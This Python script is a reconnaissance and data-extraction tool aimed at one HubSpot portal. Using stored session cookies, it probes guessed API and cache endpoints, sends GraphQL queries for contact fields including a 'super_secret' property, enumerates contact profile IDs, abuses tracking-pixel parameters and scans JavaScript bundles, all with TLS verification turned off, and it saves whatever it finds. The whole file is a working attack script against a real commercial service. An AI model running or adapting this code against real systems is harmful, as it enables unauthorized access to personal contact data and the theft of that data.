#!/usr/bin/env python3
"""
Extract data from browser storage, network requests, and other client-side sources
Simulate what a browser would have access to
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import re

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("BROWSER-SIDE DATA EXTRACTION")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. CHECK FOR SERVICE WORKER OR MANIFEST
# ============================================================================

print("\n[1] CHECKING FOR SERVICE WORKERS / WEB APP MANIFEST")
print("="*80)

manifest_urls = [
    f'https://app.hubspot.com/manifest.json',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/manifest.json',
    f'https://app.hubspot.com/sw.js',
    f'https://app.hubspot.com/service-worker.js',
]

for url in manifest_urls:
    print(f"\n{url}")

    try:
        r = requests.get(url, verify=False, timeout=10)

        if r.status_code == 200:
            print(f"  *** FOUND! ***")
            print(f"  Content: {r.text[:500]}")

            if 'firstname' in r.text.lower() or TARGET_PORTAL in r.text:
                findings.append({'type': 'manifest', 'url': url, 'content': r.text})
    except:
        pass

# ============================================================================
# 2. LOOK FOR CACHED API RESPONSES
# ============================================================================

print("\n" + "="*80)
print("[2] CHECKING FOR CACHED DATA")
print("="*80)

# Sometimes responses are cached with predictable URLs
cache_urls = [
    f'https://app.hubspot.com/api/crm/v1/objects/contacts?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/cached-contacts/{TARGET_PORTAL}',
]

for url in cache_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200 and len(r.text) > 1000:
            print(f"  Size: {len(r.text)} bytes")

            try:
                data = r.json()

                if 'contacts' in data or 'results' in data:
                    print(f"  *** CONTAINS CONTACT DATA! ***")
                    print(f"  {json.dumps(data, indent=2)[:400]}")

                    findings.append({'type': 'cached_data', 'url': url, 'data': data})
            except:
                pass
    except:
        pass

# ============================================================================
# 3. CHECK FOR WEBSOCKET ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[3] LOOKING FOR WEBSOCKET ENDPOINTS")
print("="*80)

# Try to find WebSocket connection URLs
ws_patterns = [
    f'wss://app.hubspot.com/ws',
    f'wss://realtime.hubspot.com',
    f'wss://api.hubapi.com/ws',
]

for ws_url in ws_patterns:
    print(f"\n{ws_url}")
    print(f"  Note: WebSocket requires client library, showing URL for reference")

# ============================================================================
# 4. CHECK FOR GRAPHQL ENDPOINT WITH DIFFERENT AUTH
# ============================================================================

print("\n" + "="*80)
print("[4] TESTING GRAPHQL WITH SESSION AUTH")
print("="*80)

graphql_url = 'https://api.hubapi.com/collector/graphql'

# Try different GraphQL queries
queries = [
    {
        'query': '''
        {
            contacts(portalId: "%s") {
                edges {
                    node {
                        id
                        properties {
                            firstname
                            super_secret
                            email
                        }
                    }
                }
            }
        }
        ''' % TARGET_PORTAL
    },
    {
        'query': '''
        query GetContact {
            contact(id: "1", portalId: "%s") {
                firstname
                super_secret
                email
            }
        }
        ''' % TARGET_PORTAL
    },
]

for i, query_obj in enumerate(queries, 1):
    print(f"\n  Query {i}:")

    try:
        r = session.post(graphql_url, json=query_obj, verify=False, timeout=10)

        print(f"    Status: {r.status_code}")

        if r.status_code == 200:
            print(f"    *** SUCCESS! ***")

            try:
                data = r.json()
                print(f"    {json.dumps(data, indent=2)[:500]}")

                if 'super_secret' in json.dumps(data).lower():
                    findings.append({'type': 'graphql', 'query': query_obj, 'data': data})
            except:
                print(f"    Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 5. CHECK FOR CONTACT PROFILE PAGES
# ============================================================================

print("\n" + "="*80)
print("[5] CHECKING FOR PUBLIC CONTACT PROFILES")
print("="*80)

# Sometimes contacts have public profile pages
profile_patterns = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{{id}}/profile',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/person/{{id}}',
    f'https://contacts.hubspot.com/{TARGET_PORTAL}/{{id}}',
    f'https://profile.hubspot.com/{TARGET_PORTAL}/{{id}}',
]

# Try some common IDs
test_ids = [1, 2, 3, 100, 1000, 10000]

for pattern in profile_patterns:
    print(f"\n  Pattern: {pattern}")

    for contact_id in test_ids[:3]:  # Test first 3 IDs
        url = pattern.format(id=contact_id)

        try:
            r = session.get(url, verify=False, timeout=5)

            if r.status_code == 200 and len(r.text) > 10000:
                print(f"    ID {contact_id}: ACCESSIBLE ({len(r.text)} bytes)")

                if 'firstname' in r.text.lower() and 'email' in r.text.lower():
                    print(f"      *** CONTAINS CONTACT DATA! ***")

                    findings.append({'type': 'profile_page', 'contact_id': contact_id, 'url': url})
        except:
            pass

# ============================================================================
# 6. CHECK FOR EMAIL TRACKING PIXELS
# ============================================================================

print("\n" + "="*80)
print("[6] TESTING EMAIL TRACKING PIXELS")
print("="*80)

# Email tracking pixels sometimes return contact data
tracking_url = f'https://track.hubspot.com/__ptq.gif'

params_list = [
    {'a': TARGET_PORTAL, 'k': '14', 'r': 'https://example.com', 'vid': '1'},
    {'a': TARGET_PORTAL, 'k': '14', 'r': 'https://example.com', 'contact': '1'},
]

for params in params_list:
    print(f"\n  Params: {params}")

    try:
        r = requests.get(tracking_url, params=params, verify=False, timeout=10)

        print(f"    Status: {r.status_code}")

        if r.status_code == 200:
            print(f"    Size: {len(r.content)} bytes")
            print(f"    Content-Type: {r.headers.get('Content-Type', 'unknown')}")

            # Check response headers for contact data
            for header, value in r.headers.items():
                if 'contact' in header.lower() or 'firstname' in str(value).lower():
                    print(f"      Header: {header}: {value}")

                    findings.append({'type': 'tracking_header', 'header': header, 'value': value})
    except:
        pass

# ============================================================================
# 7. CHECK FOR DATA IN JAVASCRIPT BUNDLES
# ============================================================================

print("\n" + "="*80)
print("[7] ANALYZING JAVASCRIPT BUNDLES")
print("="*80)

# Load the main app page and extract all JS bundle URLs
try:
    main_page = session.get(f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/views/all/list', verify=False, timeout=10)

    if main_page.status_code == 200:
        # Extract JS bundle URLs
        js_urls = re.findall(r'src="(https://[^"]+\.js)"', main_page.text)

        unique_js = list(set(js_urls))[:5]  # Check first 5

        print(f"Found {len(unique_js)} JS bundles, checking first 5...")

        for js_url in unique_js:
            print(f"\n  {js_url[:60]}...")

            try:
                r = requests.get(js_url, verify=False, timeout=10)

                if r.status_code == 200:
                    # Look for hardcoded contact data
                    if TARGET_PORTAL in r.text:
                        print(f"    Contains portal ID!")

                        # Look for firstname or super_secret nearby
                        portal_matches = re.finditer(TARGET_PORTAL, r.text)

                        for match in list(portal_matches)[:3]:
                            start = max(0, match.start() - 200)
                            end = min(len(r.text), match.end() + 200)
                            context = r.text[start:end]

                            if 'firstname' in context.lower() or 'super_secret' in context.lower():
                                print(f"    *** CONTAINS CONTACT KEYWORDS NEAR PORTAL ID! ***")
                                print(f"    Context: {context[:150]}")

                                findings.append({'type': 'js_bundle', 'url': js_url, 'context': context})
            except:
                pass
except:
    pass

print("\n" + "="*80)
print("BROWSER DATA EXTRACTION COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} BROWSER-SIDE DATA SOURCES! ***\n")

    with open('/home/user/Hub/findings/BROWSER_DATA_FINDINGS.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:600]}")
else:
    print("\nNo browser-side data found.")
